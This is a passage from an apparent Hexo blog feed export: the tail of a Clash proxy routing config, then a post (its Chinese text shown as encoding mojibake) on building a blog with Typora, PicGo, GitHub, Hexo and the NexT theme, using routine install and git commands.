IP-CIDR,182.254.116.0/24,DIRECT</span><br><span class="line">- IP-CIDR,203.205.252.0/23,DIRECT</span><br><span class="line">- IP-CIDR,203.205.254.0/23,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; YYeTs</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">USER-AGENT,YYeTs*,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,jstucdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zimuzu.io,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zimuzu.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmz2019.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmzapi.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmzapi.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zmzfile.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Content Delivery Network</span></span><br><span class="line">- DOMAIN-SUFFIX,ccgslb.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ccgslb.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chinanetcenter.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meixincdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ourdvs.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,staticdn.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,wangsu.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; IP Query</span></span><br><span class="line">- DOMAIN-SUFFIX,ipip.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ip.la,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ip-cdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ipv6-test.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,test-ipv6.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,whatismyip.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Speed Test</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">- DOMAIN-SUFFIX,speedtest.net,DIRECT</span></span><br><span class="line">- DOMAIN-SUFFIX,netspeedtestmaster.com,DIRECT</span><br><span class="line">- DOMAIN,speedtest.macpaw.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Private Tracker</span></span><br><span class="line">- DOMAIN-SUFFIX,awesome-hd.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,broadcasthe.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chdbits.co,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,classix-unlimited.co.uk,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,empornium.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,gazellegames.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hdchina.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hdsky.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,icetorrent.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jpopsuki.eu,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,keepfrds.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,madsrevolution.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,m-team.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nanyangpt.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ncore.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,open.cd,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ourbits.club,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,passthepopcorn.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,privatehd.to,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,redacted.ch,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,springsunday.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tjupt.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,totheglory.im,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Scholar</span></span><br><span class="line">- DOMAIN-SUFFIX,acm.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,acs.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aip.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ams.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,annualreviews.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aps.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ascelibrary.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,asm.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,asme.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,astm.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bmj.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cambridge.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cas.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,clarivate.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ebscohost.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,emerald.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,engineeringvillage.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,icevirtuallibrary.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ieee.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,imf.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,iop.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jamanetwork.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jhu.edu,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jstor.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,karger.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,libguides.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,madsrevolution.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mpg.de,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myilibrary.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nature.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oecd-ilibrary.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,osapublishing.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oup.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ovid.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oxfordartonline.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oxfordbibliographies.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oxfordmusiconline.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,pnas.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,proquest.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,rsc.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sagepub.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sciencedirect.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sciencemag.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,scopus.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,siam.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,spiedigitallibrary.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,springer.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,springerlink.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tandfonline.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,un.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,uni-bielefeld.de,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,webofknowledge.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,westlaw.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,wiley.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,worldbank.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,worldscientific.com,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Plex Media Server</span></span><br><span class="line">- DOMAIN-SUFFIX,plex.tv,DIRECT</span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Other</span></span><br><span class="line">- DOMAIN-SUFFIX,cn,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,360in.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,51ym.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,8686c.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,abchina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,accuweather.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aicoinstorge.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,air-matters.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,air-matters.io,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,aixifan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,amd.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,b612.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bdatu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,beitaichufang.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bjango.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,booking.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,bstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cailianpress.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,camera360.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chinaso.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chua.pro,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chuimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chunyu.mobi,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,chushou.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cmbchina.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,cmbimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ctrip.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dfcfw.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,docschina.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,douban.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,doubanio.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,douyu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dxycdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,dytt8.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,eastmoney.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,eudic.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,feng.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,fengkongcloud.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,frdic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,futu5.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,futunn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,gandi.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,geilicdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,getpricetag.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,gifshow.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,godic.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hicloud.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hongxiu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,hostbuf.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,huxiucdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,huya.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,infinitynewtab.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ithome.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,java.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,jidian.im,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kaiyanapp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kaspersky-labs.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,keepcdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,kkmh.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,licdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,linkedin.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,loli.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,luojilab.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,maoyan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,maoyun.tv,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meituan.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,meituan.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mobike.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,moke.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,mubu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,myzaker.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nim-lang-cn.org,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,nvidia.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,oracle.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,paypal.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,paypalobjects.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qdaily.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qidian.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qyer.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,qyerstatic.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,raychase.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ronghub.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ruguoapp.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,s-reader.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sankuai.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,scomper.me,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,seafile.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sm.ms,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,smzdm.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,snapdrop.net,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,snwx.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,sspai.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,takungpao.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,teamviewer.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,tianyancha.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,udacity.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,uning.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,vmware.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weather.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weico.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,weidian.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xiachufang.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,ximalaya.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xinhuanet.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,xmcdn.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,yangkeduo.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhangzishi.cc,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhihu.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhimg.com,DIRECT</span><br><span class="line">- DOMAIN-SUFFIX,zhuihd.com,DIRECT</span><br><span class="line">- DOMAIN,download.jetbrains.com,DIRECT</span><br><span class="line">- DOMAIN,images-cn.ssl-images-amazon.com,DIRECT</span><br><span class="line">- DOMAIN,cdn.angruo.com,DIRECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">&gt; Apple</span></span><br><span class="line">- DOMAIN-SUFFIX,aaplimg.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple.co,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple.com.cn,Apple</span><br><span class="line">- DOMAIN-SUFFIX,apple-cloudkit.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,appstore.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,cdn-apple.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,crashlytics.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,icloud.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,icloud.com.cn,Apple</span><br><span class="line">- DOMAIN-SUFFIX,icloud-content.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,me.com,Apple</span><br><span class="line">- DOMAIN-SUFFIX,mzstatic.com,Apple</span><br><span class="line">- DOMAIN,www-cdn.icloud.com.akadns.net,Apple</span><br><span class="line">- IP-CIDR,17.0.0.0/8,Apple,no-resolve</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Local Area Network</span></span><br><span class="line">- IP-CIDR,192.168.0.0/16,DIRECT</span><br><span class="line">- IP-CIDR,10.0.0.0/8,DIRECT</span><br><span class="line">- IP-CIDR,172.16.0.0/12,DIRECT</span><br><span class="line">- IP-CIDR,127.0.0.0/8,DIRECT</span><br><span class="line">- IP-CIDR,100.64.0.0/10,DIRECT</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">DNSPod Public DNS+</span></span><br><span class="line">- IP-CIDR,119.28.28.28/32,DIRECT,no-resolve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">GeoIP China</span></span><br><span class="line">- GEOIP,CN,DIRECT</span><br><span class="line"></span><br><span class="line">- MATCH,Final</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Clash <span class="keyword">for</span> Windows</span></span><br><span class="line">cfw-bypass:</span><br><span class="line">  - qq.com</span><br><span class="line">  - music.163.com</span><br><span class="line">  - &#x27;*.music.126.net&#x27;</span><br><span class="line">  - localhost</span><br><span class="line">  - 127.*</span><br><span class="line">  - 10.*</span><br><span class="line">  - 172.16.*</span><br><span class="line">  - 172.17.*</span><br><span class="line">  - 172.18.*</span><br><span class="line">  - 172.19.*</span><br><span class="line">  - 172.20.*</span><br><span class="line">  - 172.21.*</span><br><span class="line">  - 172.22.*</span><br><span class="line">  - 172.23.*</span><br><span class="line">  - 172.24.*</span><br><span class="line">  - 172.25.*</span><br><span class="line">  - 172.26.*</span><br><span class="line">  - 172.27.*</span><br><span class="line">  - 172.28.*</span><br><span class="line">  - 172.29.*</span><br><span class="line">  - 172.30.*</span><br><span class="line">  - 172.31.*</span><br><span class="line">  - 192.168.*</span><br><span class="line">  - &lt;local&gt;</span><br><span class="line">cfw-latency-timeout: 5000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>chaos</category>
      </categories>
      <tags>
        <tag>chaos</tag>
      </tags>
  </entry>
  <entry>
    <title>é˜¿é‡Œäº‘+Typora+PicGo+Github+Hexo+Nextä¸»é¢˜æ­å»ºä¸ªäººåšå®¢</title>
    <url>/2021/12/29/Chaos/%E9%98%BF%E9%87%8C%E4%BA%91+Typora+PicGo+Github+Hexo+Next%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="é˜¿é‡Œäº‘-Typora-PicGo-Github-Hexo-Nextä¸»é¢˜æ­å»ºä¸ªäººåšå®¢"><a href="#é˜¿é‡Œäº‘-Typora-PicGo-Github-Hexo-Nextä¸»é¢˜æ­å»ºä¸ªäººåšå®¢" class="headerlink" title="é˜¿é‡Œäº‘+Typora+PicGo+Github+Hexo+Nextä¸»é¢˜æ­å»ºä¸ªäººåšå®¢"></a>é˜¿é‡Œäº‘+Typora+PicGo+Github+Hexo+Nextä¸»é¢˜æ­å»ºä¸ªäººåšå®¢</h1><ul>
<li>å¼€é€šé˜¿é‡Œäº‘å¯¹è±¡å­˜å‚¨</li>
<li>ä¸‹è½½Typora</li>
<li>ä¸‹è½½Picgo</li>
<li>typoraé…ç½®å›¾ç‰‡é€šè¿‡picgoä¸Šä¼ </li>
<li>picgoé…ç½®é˜¿é‡Œäº‘çš„secretKeyå’ŒsecretId</li>
<li>å®‰è£…hexoï¼ˆéœ€è¦å…ˆå®‰è£…nodejsï¼‰</li>
<li>githubæ–°å»ºä»“åº“</li>
<li>Hexoé…ç½®å‘å¸ƒåˆ°githubæˆ–ä¸ªäººæœåŠ¡å™¨ï¼ˆéœ€è¦é…ç½®ï¼‰</li>
<li>ä¿®æ”¹ä¸»é¢˜</li>
</ul>
<p>å®‰è£…homebrew</p>
<h2 id="å®‰è£…PicGo"><a href="#å®‰è£…PicGo" class="headerlink" title="å®‰è£…PicGo"></a>å®‰è£…PicGo</h2><p><a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
<p>é…ç½®é˜¿é‡Œäº‘å›¾åºŠ</p>
<h2 id="å‘å¸ƒåšå®¢"><a href="#å‘å¸ƒåšå®¢" class="headerlink" title="å‘å¸ƒåšå®¢"></a>å‘å¸ƒåšå®¢</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install node</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">githubåˆ›å»ºä¸€ä¸ªä»“åº“</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…git</span></span><br><span class="line">brew install git</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;ä½ çš„GitHubç”¨æˆ·å&quot;</span><br><span class="line">git config --global user.email &quot;ä½ çš„GitHubæ³¨å†Œé‚®ç®±&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C &quot;ä½ çš„GitHubæ³¨å†Œé‚®ç®±&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç„¶åç›´æ¥ä¸‰ä¸ªå›è½¦å³å¯ï¼Œé»˜è®¤ä¸éœ€è¦è®¾ç½®å¯†ç </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç„¶åæ‰¾åˆ°ç”Ÿæˆçš„.sshçš„æ–‡ä»¶å¤¹ä¸­çš„id_rsa.pubå¯†é’¥ï¼Œå°†å†…å®¹å…¨éƒ¨å¤åˆ¶åˆ°github</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">npm install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¿é—®ä¸äº†githubï¼Œ è¦ç¿»å¢™</span></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive hexo-generator-searchdb</span><br><span class="line"></span><br><span class="line">npm install --save hexo-deployer-git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hexo clean </span><br><span class="line">hexo g </span><br><span class="line">hexo d</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">githubç”Ÿæˆtokenï¼Œå¯†ç å¡«token</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç”ŸæˆTokençš„æ—¶å€™è¦è®¾ç½®æƒé™</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è®¾ç½®ä¸»é¢˜</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹é…ç½®æ–‡ä»¶blog/_config.yml</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Site</span></span><br><span class="line">title: YeChun</span><br><span class="line">subtitle: &#x27;I love mw.&#x27;</span><br><span class="line">description: &#x27;æœèŠ±å¤•æ‹¾ èŠä»¥è®°ä¹‹&#x27;</span><br><span class="line">keywords:</span><br><span class="line">author: YeChunChen</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: &#x27;Asia/Shanghai&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">theme: next</span><br><span class="line"></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/pure-cyc/pure-cyc.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è®¾ç½®ä¸»é¢˜</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">clashé‡æ–°è®¾ç½®ä»£ç†</span></span><br><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890</span><br><span class="line">git clone https://github.com/next-theme/hexo-theme-next.git themes/next</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">é…ç½®next/_config.yml</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Remove unnecessary files after hexo generate.</span></span><br><span class="line">minify: true</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Schemes</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">scheme: Muse</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">scheme: Mist</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">scheme: Pisces</span></span><br><span class="line">scheme: Gemini</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">about: /about/ || fa fa-user</span></span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/pure-cyc || fab fa-github</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">E-Mail: mailto:@gmail.com || fa fa-envelope</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Weibo: https://weibo.com/yourname || fab fa-weibo</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Google: https://plus.google.com/yourname || fab fa-google</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Twitter: https://twitter.com/yourname || fab fa-twitter</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">FB Page: https://www.facebook.com/yourname || fab fa-facebook</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">StackOverflow: https://stackoverflow.com/yourname || fab fa-stack-overflow</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">YouTube: https://youtube.com/yourname || fab fa-youtube</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Instagram: https://instagram.com/yourname || fab fa-instagram</span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash">Skype: skype:yourname?call|chat || fab fa-skype</span></span><br><span class="line">  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Mermaid tag</span></span><br><span class="line">mermaid:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">Available themes: default | dark | forest | neutral</span></span><br><span class="line">  theme:</span><br><span class="line">    light: default</span><br><span class="line">    dark: dark</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¼€å¯search</span></span><br><span class="line">npm install hexo-generator-searchdb</span><br><span class="line"><span class="meta"># </span><span class="language-bash">blog/_config.yml</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span 